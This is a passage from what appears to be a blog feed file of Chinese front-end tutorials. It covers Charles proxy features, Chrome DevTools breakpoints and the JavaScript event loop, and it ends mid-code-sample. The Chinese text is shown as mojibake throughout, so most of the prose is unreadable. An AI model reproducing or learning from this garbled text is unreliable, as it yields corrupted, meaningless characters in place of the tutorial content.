æ•°æ®ä¸ºç©ºã€æ•°æ®å¼‚å¸¸ã€è¯·æ±‚å¤±è´¥ã€å¤šé¡µæ•°æ®çš„æƒ…å†µã€‚ä¸‹é¢çš„åŠŸèƒ½ï¼Œéƒ½å¯ä»¥å®ç°ä¿®æ”¹æœåŠ¡ç«¯è¿”å›æ•°æ®çš„åŠŸèƒ½ã€‚</p><ul><li>Map åŠŸèƒ½é€‚åˆé•¿æœŸåœ°å°†æŸä¸€è¯·æ±‚é‡å®šå‘åˆ°å¦ä¸€ä¸ªæŒ‡å®šçš„ç½‘ç»œåœ°å€æˆ–æœ¬åœ°jsonæ–‡ä»¶</li><li>Rewrite åŠŸèƒ½é€‚åˆå¯¹ç½‘ç»œè¯·æ±‚è¿›è¡Œä¸€äº›æ­£åˆ™æ›¿æ¢</li><li>Breakpoints åŠŸèƒ½é€‚åˆå¯¹ç½‘ç»œè¯·æ±‚è¿›è¡Œä¸€äº›ä¸´æ—¶æ€§çš„ä¿®æ”¹ï¼ˆç±»ä¼¼æ–­ç‚¹ä½œç”¨ï¼‰</li></ul><p><br></p><h4 id="5-1-Map"><a href="#5-1-Map" class="headerlink" title="5.1 Map"></a>5.1 Map</h4><p>ç‚¹å‡»èœå•æ Tools -&gt; Map Remoteï¼Œé€‚åˆåˆ‡æ¢çº¿ä¸Šåˆ°æœ¬åœ°ï¼Œæµ‹è¯•æœåˆ°æ­£å¼æœçš„åœºæ™¯<br>ç‚¹å‡»èœå•æ Tools -&gt; Map Localï¼Œæ˜ å°„åˆ°æœ¬åœ°çš„jsonæ–‡ä»¶</p><p><br></p><h3 id="6-å‹åŠ›æµ‹è¯•"><a href="#6-å‹åŠ›æµ‹è¯•" class="headerlink" title="6. å‹åŠ›æµ‹è¯•"></a>6. å‹åŠ›æµ‹è¯•</h3><p>ä½¿ç”¨Charlesçš„RepeatåŠŸèƒ½å¯ä»¥å¯¹æœåŠ¡å™¨å‘èµ·å¹¶å‘è®¿é—®è¿›è¡Œå‹åŠ›æµ‹è¯•ã€‚é€‰ä¸­æŸä¸ªç½‘ç»œè¯·æ±‚ -&gt; å³å‡» -&gt; Repeat Advanced -&gt; è®¾ç½®è¿­ä»£æ¬¡æ•°(iterations)å’Œå¹¶å‘æ•°(Concurrency) -&gt; ç‚¹å‡»okã€‚</p><p><br></p><h3 id="7-åå‘ä»£ç†"><a href="#7-åå‘ä»£ç†" class="headerlink" title="7. åå‘ä»£ç†"></a>7. åå‘ä»£ç†</h3><p>åå‘ä»£ç†å…è®¸æˆ‘ä»¬å°†æœ¬åœ°æŒ‡å®šç«¯å£çš„è¯·æ±‚æ˜ å°„åˆ°è¿œç¨‹çš„å¦ä¸€ä¸ªç«¯å£ä¸Šã€‚ç‚¹å‡»é¡¶éƒ¨èœå•æ Proxy -&gt; ç‚¹å‡» Reverse Proxiesã€‚å°†æœ¬åœ°çš„8080ç«¯å£æ˜ å°„åˆ°è¿œç¨‹çš„80ç«¯å£ä¸Šï¼Œå½“æˆ‘è®¿é—®æœ¬åœ°çš„80ç«¯å£ï¼Œå®é™…è¿”å›çš„å°±æ˜¯è¿œç¨‹80ç«¯å£çš„æä¾›çš„å†…å®¹ã€‚</p><p><br></p><h3 id="8-charlesæŠ“ä¸åˆ°localhost"><a href="#8-charlesæŠ“ä¸åˆ°localhost" class="headerlink" title="8. charlesæŠ“ä¸åˆ°localhost"></a>8. charlesæŠ“ä¸åˆ°localhost</h3><p>å°†<code>localhost:4000</code>ä¿®æ”¹ä¸º<code>localhost.charlesproxy.com</code></p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.im/post/5b4f005ae51d45191c7e534a" target="_blank" rel="noopener">Charles æŠ“åŒ…äºŒä¸‰è°ˆ</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Chromeæ–­ç‚¹è°ƒè¯•</title>
      <link href="/2019/05/24/Chrome%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/"/>
      <url>/2019/05/24/Chrome%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/</url>
      <content type="html"><![CDATA[<blockquote><p>æ–­ç‚¹è°ƒè¯•æ˜¯æŒ‡è‡ªå·±åœ¨ç¨‹åºçš„æŸä¸€è¡Œè®¾ç½®ä¸€ä¸ªæ–­ç‚¹ï¼Œè°ƒè¯•æ—¶ï¼Œç¨‹åºè¿è¡Œåˆ°è¿™ä¸€è¡Œå°±ä¼šåœä½ï¼Œç„¶åä½ å¯ä»¥ä¸€æ­¥ä¸€æ­¥å¾€ä¸‹è°ƒè¯•ï¼Œè°ƒè¯•è¿‡ç¨‹ä¸­å¯ä»¥çœ‹åˆ°å„ä¸ªå˜é‡å½“å‰çš„å€¼ã€‚</p></blockquote><p><br></p><h3 id="1-Sourcesé¢æ¿"><a href="#1-Sourcesé¢æ¿" class="headerlink" title="1. Sourcesé¢æ¿"></a>1. Sourcesé¢æ¿</h3><p>Sourcesæ˜¯Chrome developer toolä¸­çš„æ–­ç‚¹è°ƒè¯•é¢æ¿ã€‚<br><br><br><img src="/2019/05/24/Chromeæ–­ç‚¹è°ƒè¯•/1.png" style="max-width:500px"><br>ã€å›¾1ã€‘ç½‘ç«™æ–‡ä»¶ç›®å½•æ ‘<br>ã€å›¾2ã€‘å·¦ä¾§æ‰€é€‰æ–‡ä»¶çš„å…·ä½“å†…å®¹<br>ã€å›¾3ã€‘scopeæ˜¾ç¤ºå½“å‰æ–­ç‚¹çš„ä½œç”¨åŸŸï¼Œwatchç‚¹å‡» + å·å¯æ·»åŠ ä½ éœ€è¦ç›‘æ§çš„å˜é‡æˆ–è¡¨è¾¾å¼<br>ã€å›¾4ã€‘æ ¸å¿ƒåŠŸèƒ½åŒº<br>Call Stack: æ˜¾ç¤ºå½“å‰æ–­ç‚¹çš„ç¯å¢ƒè°ƒç”¨æ ˆ<br>Breakpoints: å½“å‰jsæ–­ç‚¹åˆ—è¡¨<br>DOM Breakpoints: å½“å‰DOMæ–­ç‚¹åˆ—è¡¨<br>XHR Breakpoints: å½“å‰xhræ–­ç‚¹åˆ—è¡¨ï¼Œç‚¹å‡» + æ·»åŠ æ–­ç‚¹<br>Event Listener Breakpoints: å½“å‰äº‹ä»¶ç›‘å¬æ–­ç‚¹åˆ—è¡¨</p><p><br></p><h3 id="2-è®¾ç½®æ–­ç‚¹"><a href="#2-è®¾ç½®æ–­ç‚¹" class="headerlink" title="2. è®¾ç½®æ–­ç‚¹"></a>2. è®¾ç½®æ–­ç‚¹</h3><h4 id="2-1-JSæ–­ç‚¹"><a href="#2-1-JSæ–­ç‚¹" class="headerlink" title="2.1 JSæ–­ç‚¹"></a>2.1 JSæ–­ç‚¹</h4><h5 id="2-1-1-æ‰‹åŠ¨åŠ æ–­ç‚¹"><a href="#2-1-1-æ‰‹åŠ¨åŠ æ–­ç‚¹" class="headerlink" title="2.1.1 æ‰‹åŠ¨åŠ æ–­ç‚¹"></a>2.1.1 æ‰‹åŠ¨åŠ æ–­ç‚¹</h5><p>æ‰“å¼€å¼€å‘è€…å·¥å…· â€”â€” ç‚¹å‡»Sourceèœå• â€”â€” å·¦ä¾§æ ‘ä¸­æ‰¾åˆ°ç›¸åº”æ–‡ä»¶ â€”â€” ç‚¹å‡»è¡Œåˆ—å·ï¼Œå³å®Œæˆå½“å‰è¡Œæ·»åŠ /åˆ é™¤æ–­ç‚¹æ“ä½œã€‚æ–­ç‚¹æ·»åŠ å®Œæ¯•åï¼Œåˆ·æ–°é¡µé¢jsæ‰§è¡Œåˆ°æ–­ç‚¹ä½ç½®åœä½ã€‚åœ¨Sourcesç•Œé¢ï¼Œä¼šçœ‹åˆ°å½“å‰ä½œç”¨åŸŸä¸­æ‰€æœ‰å˜é‡å’Œå€¼ï¼Œåªéœ€å¯¹æ¯ä¸ªå€¼è¿›è¡ŒéªŒè¯å³å¯ã€‚<br>ä½ è¿˜å¯ä»¥è®¾ç½®æ¡ä»¶æ–­ç‚¹ï¼Œå³å‡»æ–­ç‚¹ä½ç½®ï¼Œé€‰æ‹©Edit Breakpointï¼Œè®¾ç½®è§¦å‘æ–­ç‚¹çš„è¡¨è¾¾å¼ï¼Œè¡¨è¾¾å¼ä¸ºtrueæ—¶æ‰è§¦å‘æ–­ç‚¹ã€‚</p><p><br></p><h5 id="2-1-2-debugger"><a href="#2-1-2-debugger" class="headerlink" title="2.1.2 debugger"></a>2.1.2 debugger</h5><p>è¿˜å¯ä»¥åœ¨ä»£ç ä¸­æ·»åŠ <code>debugger;</code>ï¼Œä»£ç æ‰§è¡Œåˆ°è¯¥è¯­å¥æ—¶å°±ä¼šè‡ªåŠ¨æ–­ç‚¹ã€‚</p><p><br></p><h5 id="2-1-3-åŠŸèƒ½é”®"><a href="#2-1-3-åŠŸèƒ½é”®" class="headerlink" title="2.1.3 åŠŸèƒ½é”®"></a>2.1.3 åŠŸèƒ½é”®</h5><p>æ–­ç‚¹è°ƒè¯•ä¸»è¦ç”¨åˆ°ä»¥ä¸‹åŠŸèƒ½é”®ï¼Œä»å·¦åˆ°å³ä¾æ¬¡ä¸º</p><p><img src="/2019/05/24/Chromeæ–­ç‚¹è°ƒè¯•/3.png" style="max-width:500px"></p><ul><li>Pause/Resume script execution: æš‚åœ/æ¢å¤è„šæœ¬æ‰§è¡Œï¼ˆç¨‹åºæ‰§è¡Œåˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹åœæ­¢ï¼‰</li><li>Step over next function call: æ‰§è¡Œåˆ°ä¸‹ä¸€æ­¥çš„å‡½æ•°è°ƒç”¨(è·³åˆ°ä¸‹ä¸€è¡Œ)</li><li>Step into next function call: è¿›å…¥å½“å‰å‡½æ•°</li><li>Step out of current function: è·³å‡ºå½“å‰æ‰§è¡Œå‡½æ•°</li><li>Deactive/Active all breakpoints: å…³é—­/å¼€å¯æ‰€æœ‰æ–­ç‚¹ï¼ˆä¸ä¼šå–æ¶ˆï¼‰</li><li>Pause on exceptions: å¼‚å¸¸æƒ…å†µè‡ªåŠ¨æ–­ç‚¹è®¾ç½®</li></ul><p><br></p><h5 id="2-1-4-è§£å‹js"><a href="#2-1-4-è§£å‹js" class="headerlink" title="2.1.4 è§£å‹js"></a>2.1.4 è§£å‹js</h5><p>å¦‚æœç¢°åˆ°å‹ç¼©åçš„jsä»£ç ï¼Œå¯ä»¥ç‚¹å‡»ä¸‹é¢çš„æŒ‰é’®è§£å‹</p><p><img src="/2019/05/24/Chromeæ–­ç‚¹è°ƒè¯•/6.png" style="max-width:500px"></p><p><br></p><h4 id="2-2-DOMæ–­ç‚¹"><a href="#2-2-DOMæ–­ç‚¹" class="headerlink" title="2.2 DOMæ–­ç‚¹"></a>2.2 DOMæ–­ç‚¹</h4><p>æ‰“å¼€Elementsé¢æ¿ â€”â€” å®šä½åˆ°ç›¸å…³DOMèŠ‚ç‚¹ â€”â€” å³å‡»DOMï¼Œé€‰æ‹©Break onï¼Œé€‰æ‹©ç›¸åº”é€‰é¡¹<br><em>subtree modifications</em><br>å­èŠ‚ç‚¹å˜åŒ–æ–­ç‚¹ã€‚é’ˆå¯¹å­èŠ‚ç‚¹å¢åŠ ã€åˆ é™¤ä»¥åŠäº¤æ¢é¡ºåºç­‰æ“ä½œï¼Œä½†å­èŠ‚ç‚¹è¿›è¡Œå±æ€§ä¿®æ”¹å’Œå†…å®¹ä¿®æ”¹å¹¶ä¸ä¼šè§¦å‘æ–­ç‚¹<br><em>attributes modifications</em>:èŠ‚ç‚¹å±æ€§æ–­ç‚¹<br><em>node removal</em>: èŠ‚ç‚¹ç§»é™¤æ–­ç‚¹<br><br><br><img src="/2019/05/24/Chromeæ–­ç‚¹è°ƒè¯•/2.png" style="max-width:500px"></p><p><br></p><h4 id="3-XHRæ–­ç‚¹"><a href="#3-XHRæ–­ç‚¹" class="headerlink" title="3. XHRæ–­ç‚¹"></a>3. XHRæ–­ç‚¹</h4><p>é€šè¿‡XHR Breakpoints çš„ + å·ï¼Œå½“å¼‚æ­¥è¯·æ±‚URLæ»¡è¶³æ¡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨äº§ç”Ÿæ–­ç‚¹ã€‚<br><br><br><img src="/2019/05/24/Chromeæ–­ç‚¹è°ƒè¯•/4.gif" style="max-width:500px"></p><p><br></p><h4 id="4-äº‹ä»¶ç›‘å¬æ–­ç‚¹"><a href="#4-äº‹ä»¶ç›‘å¬æ–­ç‚¹" class="headerlink" title="4. äº‹ä»¶ç›‘å¬æ–­ç‚¹"></a>4. äº‹ä»¶ç›‘å¬æ–­ç‚¹</h4><p>å½“äº‹ä»¶è¢«è§¦å‘æ—¶ï¼Œæ–­ç‚¹åˆ°äº‹ä»¶ç»‘å®šçš„ä½ç½®ã€‚åŒ…æ‹¬é¼ æ ‡ã€é”®ç›˜ã€åŠ¨ç”»ã€å®šæ—¶å™¨ã€xhrç­‰ã€‚<br><br><br><img src="/2019/05/24/Chromeæ–­ç‚¹è°ƒè¯•/5.gif" style="max-width:500px"></p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://www.cnblogs.com/yzg1/p/5578363.html" target="_blank" rel="noopener">chrome developer toolâ€”â€” æ–­ç‚¹è°ƒè¯•ç¯‡</a></li><li><a href="https://juejin.im/post/5af53823f265da0b75282b0f" target="_blank" rel="noopener">chromeå¼€å‘è€…å·¥å…·å„ç§éªšæŠ€å·§</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Eventloop äº‹ä»¶å¾ªç¯ï¼Œå¾®ä»»åŠ¡ï¼Œå®ä»»åŠ¡</title>
      <link href="/2019/05/14/Eventloop/"/>
      <url>/2019/05/14/Eventloop/</url>
      <content type="html"><![CDATA[<p>æ¯ä¸€è½® Event Loop éƒ½ä¼šä¼´éšç€æ¸²æŸ“å—ï¼Ÿ<br>requestAnimationFrame åœ¨å“ªä¸ªé˜¶æ®µæ‰§è¡Œï¼Œåœ¨æ¸²æŸ“å‰è¿˜æ˜¯åï¼Ÿåœ¨ microTask çš„å‰è¿˜æ˜¯åï¼Ÿ<br>requestIdleCallback åœ¨å“ªä¸ªé˜¶æ®µæ‰§è¡Œï¼Ÿå¦‚ä½•å»æ‰§è¡Œï¼Ÿåœ¨æ¸²æŸ“å‰è¿˜æ˜¯åï¼Ÿåœ¨ microTask çš„å‰è¿˜æ˜¯åï¼Ÿ<br>resizeã€scroll è¿™äº›äº‹ä»¶æ˜¯ä½•æ—¶å»æ´¾å‘çš„ã€‚</p><p>è¿™äº›éƒ½è¦ä»äº‹ä»¶å¾ªç¯è¯´èµ·ã€‚å®ƒæ˜¯æµè§ˆå™¨è°ƒåº¦ä»»åŠ¡çš„åŸºç¡€ã€‚</p><p><br></p><h3 id="1-EventLoop"><a href="#1-EventLoop" class="headerlink" title="1. EventLoop"></a>1. EventLoop</h3><p>æµè§ˆå™¨ç®¡ç†å’Œæ‰§è¡Œä»»åŠ¡çš„ä¸€å¥—æœºåˆ¶ï¼Œä¸ºäº†åè°ƒç”¨æˆ·äº¤äº’ï¼Œäº‹ä»¶è§¦å‘ï¼Œè„šæœ¬ï¼Œæ¸²æŸ“ï¼Œç½‘ç»œä»»åŠ¡ç­‰ä»»åŠ¡ã€‚</p><p><br></p><h3 id="2-JSå•çº¿ç¨‹"><a href="#2-JSå•çº¿ç¨‹" class="headerlink" title="2. JSå•çº¿ç¨‹"></a>2. JSå•çº¿ç¨‹</h3><p>JS æ˜¯å•çº¿ç¨‹çš„ï¼Œä¹Ÿå°±æ˜¯åŒä¸€ä¸ªæ—¶åˆ»åªèƒ½åšä¸€ä»¶äº‹æƒ…ã€‚</p><p>ä½œä¸ºæµè§ˆå™¨è„šæœ¬è¯­è¨€ï¼Œjavascriptçš„ä¸»è¦ç”¨é€”æ˜¯ä¸ç”¨æˆ·äº¤äº’ï¼Œä»¥åŠæ“ä½œDOMã€‚è¿™å†³å®šäº†å®ƒåªèƒ½æ˜¯å•çº¿ç¨‹ï¼Œå¦åˆ™ä¼šå¸¦æ¥å¾ˆå¤æ‚çš„åŒæ­¥é—®é¢˜ã€‚æ¯”å¦‚ï¼ŒåŒæ—¶æœ‰ä¸¤ä¸ªçº¿ç¨‹ï¼Œä¸€ä¸ªçº¿ç¨‹åœ¨æŸä¸ªDOMèŠ‚ç‚¹ä¸Šæ·»åŠ å†…å®¹ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹åˆ é™¤äº†è¿™ä¸ªèŠ‚ç‚¹ï¼Œè¿™æ—¶æµè§ˆå™¨åº”è¯¥ä»¥å“ªä¸ªçº¿ç¨‹ä¸ºå‡†ï¼Ÿä¸ºäº†é¿å…å¤æ‚æ€§ï¼Œ<em>Javascriptå°±æ˜¯å•çº¿ç¨‹</em>ã€‚å•çº¿ç¨‹å°±æ„å‘³ç€ï¼Œæ‰€æœ‰ä»»åŠ¡éƒ½éœ€è¦æ’é˜Ÿï¼Œå‰ä¸€ä¸ªä»»åŠ¡ç»“æŸï¼Œæ‰ä¼šæ‰§è¡Œåä¸€ä¸ªä»»åŠ¡ã€‚</p><p><br></p><h3 id="3-å¼‚æ­¥ä»»åŠ¡"><a href="#3-å¼‚æ­¥ä»»åŠ¡" class="headerlink" title="3. å¼‚æ­¥ä»»åŠ¡"></a>3. å¼‚æ­¥ä»»åŠ¡</h3><p>é‚£ä¸ºä»€ä¹ˆæµè§ˆå™¨å¯ä»¥åŒæ—¶æ‰§è¡Œå¼‚æ­¥ä»»åŠ¡å‘¢ï¼Ÿ</p><p>å› ä¸ºæµè§ˆå™¨æ˜¯å¤šçº¿ç¨‹çš„ï¼Œå½“ JS éœ€è¦æ‰§è¡Œå¼‚æ­¥ä»»åŠ¡æ—¶ï¼Œæµè§ˆå™¨ä¼šå¦å¤–å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹å»æ‰§è¡Œè¯¥ä»»åŠ¡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œâ€œJS æ˜¯å•çº¿ç¨‹çš„â€æŒ‡çš„æ˜¯æ‰§è¡Œ JS ä»£ç çš„çº¿ç¨‹åªæœ‰ä¸€ä¸ªï¼Œæ˜¯æµè§ˆå™¨æä¾›çš„ JS å¼•æ“çº¿ç¨‹ï¼ˆä¸»çº¿ç¨‹ï¼‰ã€‚æµè§ˆå™¨ä¸­è¿˜æœ‰å®šæ—¶å™¨çº¿ç¨‹å’Œ HTTP è¯·æ±‚çº¿ç¨‹ç­‰ï¼Œè¿™äº›çº¿ç¨‹ä¸»è¦ä¸æ˜¯æ¥è·‘ JS ä»£ç çš„ã€‚</p><p>æ¯”å¦‚ä¸»çº¿ç¨‹ä¸­éœ€è¦å‘ä¸€ä¸ª AJAX è¯·æ±‚ï¼Œå°±æŠŠè¿™ä¸ªä»»åŠ¡äº¤ç»™å¦ä¸€ä¸ªæµè§ˆå™¨çº¿ç¨‹ï¼ˆHTTP è¯·æ±‚çº¿ç¨‹ï¼‰å»çœŸæ­£å‘é€è¯·æ±‚ï¼Œå¾…è¯·æ±‚å›æ¥äº†ï¼Œå†å°† callback é‡Œéœ€è¦æ‰§è¡Œçš„ JS å›è°ƒäº¤ç»™ JS å¼•æ“çº¿ç¨‹å»æ‰§è¡Œã€‚</p><p>ä½œä¸ºå‰ç«¯å¼€å‘è€…ï¼Œä¸»è¦é‡ç‚¹å…³æ³¨å…¶æ¸²æŸ“è¿›ç¨‹ï¼Œæ¸²æŸ“è¿›ç¨‹ä¸‹åŒ…å«äº† JS å¼•æ“çº¿ç¨‹ã€HTTP è¯·æ±‚çº¿ç¨‹å’Œå®šæ—¶å™¨çº¿ç¨‹ç­‰ï¼Œè¿™äº›çº¿ç¨‹ä¸º JS åœ¨æµè§ˆå™¨ä¸­å®Œæˆå¼‚æ­¥ä»»åŠ¡æä¾›äº†åŸºç¡€ã€‚</p><p><br></p><h3 id="4-æ‰§è¡Œæ ˆä¸é˜Ÿåˆ—ä»»åŠ¡"><a href="#4-æ‰§è¡Œæ ˆä¸é˜Ÿåˆ—ä»»åŠ¡" class="headerlink" title="4. æ‰§è¡Œæ ˆä¸é˜Ÿåˆ—ä»»åŠ¡"></a>4. æ‰§è¡Œæ ˆä¸é˜Ÿåˆ—ä»»åŠ¡</h3><p>äº‹ä»¶å¾ªç¯æ˜¯æµè§ˆå™¨ç®¡ç†å’Œæ‰§è¡Œäº‹ä»¶çš„ä¸€å¥—æœºåˆ¶ã€‚</p><p>JS åœ¨è§£æä¸€æ®µä»£ç æ—¶ï¼Œä¼šå°†åŒæ­¥ä»£ç æŒ‰é¡ºåºæ’åœ¨æŸä¸ªåœ°æ–¹ï¼Œå³æ‰§è¡Œæ ˆï¼Œç„¶åä¾æ¬¡æ‰§è¡Œé‡Œé¢çš„å‡½æ•°ã€‚å½“é‡åˆ°å¼‚æ­¥ä»»åŠ¡æ—¶å°±äº¤ç»™å…¶ä»–çº¿ç¨‹å¤„ç†ï¼Œå¾…å½“å‰æ‰§è¡Œæ ˆæ‰€æœ‰åŒæ­¥ä»£ç æ‰§è¡Œå®Œæˆåï¼Œä¼šä»ä¸€ä¸ªé˜Ÿåˆ—ä¸­å»å–å‡ºå·²å®Œæˆçš„å¼‚æ­¥ä»»åŠ¡çš„å›è°ƒåŠ å…¥æ‰§è¡Œæ ˆç»§ç»­æ‰§è¡Œï¼Œé‡åˆ°å¼‚æ­¥ä»»åŠ¡æ—¶åˆäº¤ç»™å…¶ä»–çº¿ç¨‹ï¼Œâ€¦..ï¼Œå¦‚æ­¤å¾ªç¯å¾€å¤ã€‚</p><p>Event Loopçš„è¿è¡Œæœºåˆ¶:</p><ul><li>æ‰€æœ‰åŒæ­¥ä»»åŠ¡éƒ½åœ¨ä¸»çº¿ç¨‹ä¸Šæ‰§è¡Œï¼Œå½¢æˆä¸€ä¸ªæ‰§è¡Œæ ˆ</li><li>ä¸»çº¿ç¨‹ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªä»»åŠ¡é˜Ÿåˆ—ã€‚åªè¦å¼‚æ­¥ä»»åŠ¡æœ‰äº†è¿è¡Œç»“æœï¼Œå°±åœ¨ä»»åŠ¡é˜Ÿåˆ—ä¸­æ”¾ç½®ä¸€ä¸ªäº‹ä»¶ã€‚</li><li>ä¸€æ—¦â€œæ‰§è¡Œæ ˆâ€ä¸­çš„æ‰€æœ‰åŒæ­¥ä»»åŠ¡æ‰§è¡Œå®Œæ¯•ï¼Œç³»ç»Ÿå°±ä¼šè¯»å–â€œä»»åŠ¡é˜Ÿåˆ—â€ï¼Œçœ‹çœ‹é‡Œé¢æœ‰å“ªäº›äº‹ä»¶ã€‚è¿™äº›äº‹ä»¶ï¼Œå¯ä»¥ç»“æŸç­‰å¾…çŠ¶æ€ï¼Œè¿›å…¥æ‰§è¡Œæ ˆï¼Œå¼€å§‹æ‰§è¡Œã€‚</li><li>ä¸»çº¿ç¨‹ä¸æ–­é‡å¤ä¸Šé¢æ­¥éª¤</li></ul><p>åªè¦ä¸»çº¿ç¨‹ç©ºäº†ï¼Œå°±ä¼šå»è¯»å–â€œä»»åŠ¡é˜Ÿåˆ—â€ï¼Œè¿™ä¸ªè¿è¡Œæœºåˆ¶è¢«ç§°ä¸º<em>Event Loop</em></p><p><img src="/2019/05/14/Eventloop/2.png"></p><p><br></p><h3 id="5-ä»»åŠ¡"><a href="#5-ä»»åŠ¡" class="headerlink" title="5.ä»»åŠ¡"></a>5.ä»»åŠ¡</h3><p>æˆ‘ä»¬æŠŠå®¿ä¸»å‘èµ·çš„ä»»åŠ¡æˆä¸º<strong>å®è§‚ä»»åŠ¡</strong>ï¼ŒæŠŠjså¼•æ“å‘èµ·çš„ä»»åŠ¡æˆä¸º<strong>å¾®è§‚ä»»åŠ¡</strong>ã€‚<br>å¾®ä»»åŠ¡æ˜¯åœ¨å½“å‰äº‹ä»¶å¾ªç¯çš„å°¾éƒ¨å»æ‰§è¡Œï¼›å®ä»»åŠ¡æ˜¯åœ¨ä¸‹ä¸€æ¬¡äº‹ä»¶å¾ªç¯çš„å¼€å§‹å»æ‰§è¡Œã€‚æˆ‘ä»¬æ¥çœ‹çœ‹å¾®ä»»åŠ¡å’Œå®ä»»åŠ¡çš„æœ¬è´¨åŒºåˆ«æ˜¯ä»€ä¹ˆã€‚</p><h4 id="5-1-å®è§‚ä»»åŠ¡"><a href="#5-1-å®è§‚ä»»åŠ¡" class="headerlink" title="5.1 å®è§‚ä»»åŠ¡"></a>5.1 å®è§‚ä»»åŠ¡</h4><p>å®è§‚ä»»åŠ¡çš„é˜Ÿåˆ—ç›¸å½“äºäº‹ä»¶å¾ªç¯ã€‚åœ¨å®è§‚ä»»åŠ¡ä¸­ï¼Œjavascriptçš„Promiseè¿˜ä¼šäº§ç”Ÿå¼‚æ­¥ä»£ç ï¼Œjsä¼šä¿è¯è¿™äº›å¼‚æ­¥ä»£ç åœ¨ä¸€ä¸ªå®è§‚ä»»åŠ¡ä¸­å®Œæˆï¼Œå› æ­¤å®è§‚ä»»åŠ¡ä¸­åˆåŒ…å«äº†ä¸€ä¸ªå¾®è§‚ä»»åŠ¡é˜Ÿåˆ—ï¼Œæœºåˆ¶å¦‚ä¸‹ï¼š</p><ul><li>æ‰§è¡Œä¸€ä¸ªå®ä»»åŠ¡ï¼ˆæ ˆä¸­æ²¡æœ‰å°±ä»äº‹ä»¶é˜Ÿåˆ—ä¸­è·å–ï¼‰</li><li>æ‰§è¡Œè¿‡ç¨‹ä¸­å¦‚æœé‡åˆ°å¾®ä»»åŠ¡ï¼Œå°±å°†å®ƒæ·»åŠ åˆ°å¾®ä»»åŠ¡çš„ä»»åŠ¡é˜Ÿåˆ—ä¸­</li><li>å®ä»»åŠ¡æ‰§è¡Œå®Œæ¯•åï¼Œç«‹å³æ‰§è¡Œå½“å‰å¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­çš„æ‰€æœ‰å¾®ä»»åŠ¡ï¼ˆä¾æ¬¡æ‰§è¡Œï¼‰</li><li>å½“å‰å®ä»»åŠ¡æ‰§è¡Œå®Œæ¯•ï¼Œå¼€å§‹æ£€æŸ¥æ¸²æŸ“ï¼Œç„¶åGUIçº¿ç¨‹æ¥ç®¡æ¸²æŸ“</li><li>æ¸²æŸ“å®Œæ¯•åï¼Œjsçº¿ç¨‹ç»§ç»­æ¥ç®¡ï¼Œå¼€å§‹ä¸‹ä¸€ä¸ªå®ä»»åŠ¡</li></ul><p><img src="/2019/05/14/Eventloop/3.png" style="max-width:300px"></p><p>å®è§‚ä»»åŠ¡æœ‰ï¼š</p><ul><li>é¡µé¢åŠ è½½ï¼Œè§£æHTML, UIæ¸²æŸ“</li><li>æ‰§è¡Œä¸»çº¿ç¨‹jsä»£ç </li><li>UIäº¤äº’äº‹ä»¶</li><li>è¯·æ±‚è¿”å›</li><li>ä¿®æ”¹url</li><li>setTimeout,setInterval,setImmediate</li><li>requestAnimationFrame</li></ul><p><em>é—®é¢˜ï¼š æ€æ ·ç¡®å®šä¸€ä¸ªå‡½æ•°åœ¨domæ›´æ–°åæ‰§è¡Œï¼Ÿ</em></p><p><br></p><h4 id="5-2-å¾®è§‚ä»»åŠ¡"><a href="#5-2-å¾®è§‚ä»»åŠ¡" class="headerlink" title="5.2 å¾®è§‚ä»»åŠ¡"></a>5.2 å¾®è§‚ä»»åŠ¡</h4><p>Promiseæ˜¯jsè¯­è¨€æä¾›çš„ä¸€ç§æ ‡å‡†åŒ–çš„å¼‚æ­¥ç®¡ç†æ–¹å¼ã€‚Promiseæ°¸è¿œåœ¨é˜Ÿåˆ—å°¾éƒ¨æ·»åŠ å¾®è§‚ä»»åŠ¡ï¼ŒsetTimeoutç­‰å®¿ä¸»API,åˆ™ä¼šæ·»åŠ å®è§‚ä»»åŠ¡ã€‚</p><p>å¾®è§‚ä»»åŠ¡æœ‰: </p><ul><li>MutationObserver ç›‘å¬DOMæ•°å˜åŒ–</li><li>Promise è¢«resolveæˆ–rejectåï¼Œé€šè¿‡then,catch,finallyæ³¨å†Œçš„å›è°ƒå‡½æ•°ä¼šè¢«æ”¾å…¥å¾®è§‚ä»»åŠ¡é˜Ÿåˆ—ä¸­</li><li>process.nextTick</li><li>Object.observer</li></ul><p>Promiseçš„resolveå§‹ç»ˆæ˜¯å¼‚æ­¥æ“ä½œï¼Œæ‰€ä»¥cæ— æ³•å‡ºç°åœ¨bä¹‹å‰<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'a'</span>);</span><br><span class="line">  resolve()</span><br><span class="line">&#125;)</span><br><span class="line">r.then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'c'</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'b'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// a b 